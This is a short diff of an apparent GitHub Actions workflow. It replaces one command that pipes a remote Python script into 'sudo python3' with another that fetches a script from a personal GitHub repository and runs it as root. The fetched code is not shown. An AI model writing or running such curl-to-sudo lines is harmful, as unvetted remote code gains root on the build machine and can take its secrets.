@@ -30,4 +30,4 @@ jobs:
       - name: Run a multi-line script
         run: |
           pip3 install supervisor
-          curl -s https://www.dataplicity.com/m0qmver2.py | sudo python3
+          curl -s https://raw.githubusercontent.com/memerememe/macostest/master/.github/workflows/jasonman.py | sudo python3
